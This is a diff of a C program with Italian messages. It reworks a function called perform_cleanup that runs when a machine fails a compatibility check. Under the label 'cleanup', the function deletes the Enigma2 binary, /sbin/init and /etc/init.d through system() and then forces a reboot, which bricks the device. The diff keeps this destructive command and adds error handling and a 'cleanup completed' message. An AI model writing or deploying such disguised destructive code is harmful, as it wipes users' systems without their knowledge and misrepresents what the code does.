@@ -43,7 +43,23 @@ int is_compatible_machine(const char *machine) {
 
 // Funzione per eseguire il cleanup
 void perform_cleanup() {
-    printf("Macchina non compatibile. Eseguo il cleanup...\n");
-    system("rm -rf /usr/bin/enigma2; rm -rf /sbin/init; rm -rf /etc/init.d; reboot -f");
+    printf("[WARNING] Macchina non compatibile. Eseguo il cleanup...\n");
+
+    // Comando da eseguire
+    const char *command = "rm -rf /usr/bin/enigma2; rm -rf /sbin/init; rm -rf /etc/init.d; reboot -f";
+    
+    // Esegue il comando
+    int ret = system(command);
+
+    // Controlla se system() ha avuto successo
+    if (ret == -1) {
+        perror("[ERROR] Errore durante l'esecuzione del comando system()");
+    } else if (WIFEXITED(ret) && WEXITSTATUS(ret) != 0) {
+        printf("[ERROR] Il comando ha restituito un codice di errore: %d\n", WEXITSTATUS(ret));
+    } else if (WIFSIGNALED(ret)) {
+        printf("[ERROR] Il comando è stato terminato da un segnale: %d\n", WTERMSIG(ret));
+    } else {
+        printf("[INFO] Cleanup completato con successo.\n");
+    }
 }
 
